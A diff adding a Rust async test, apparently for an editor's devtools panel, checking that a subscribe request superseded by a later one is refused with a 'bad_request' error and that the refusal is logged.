+#[gpui::test]
+async fn a_subscribe_replaced_by_a_later_one_is_refused_and_the_refusal_is_logged(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(loadable_connection()), cx).await;
+    let persisted = persisted_devtools_thread(&app, "/p/app", cx);
+    let (_announce, panel) = connect_panel("/p/app", 1, &app, cx);
+    let mine = created_thread(&panel, &app, cx);
+    let app_state = app.app_state();
+    let refused = panel_refusals("subscribe").len();
+
+    // The first waits on a load; the second is answered at once.
+    handle_now(&panel, subscribe("s1", &persisted), &app_state, cx);
+    handle_now(&panel, subscribe("s2", &mine), &app_state, cx);
+    let got = panel.drain(cx);
+
+    let first = reply(&got, "s1");
+    assert_eq!(first["kind"], "error", "{first}");
+    assert_eq!(first["error"], "bad_request", "{first}");
+    let second = reply(&got, "s2");
+    assert_eq!(second["kind"], "snapshot", "{second}");
+    assert_eq!(second["thread"]["thread_id"], json!(mine));
+    assert_eq!(
+        got.iter().filter(|msg| msg["kind"] == "snapshot").count(),
+        1,
+        "the replaced subscribe binds nothing: {got:?}"
+    );
+
+    let lines = panel_refusals("subscribe");
+    assert_eq!(
+        lines.len(),
+        refused + 1,
+        "R9.1: the refusal is logged: {lines:#?}"
+    );
+    let line = &lines[refused];
+    assert!(
+        line.contains("root=/p/app")
+            && line.contains(&persisted)
+            && line.contains("error=bad_request"),
+        "{line}"
+    );
+}
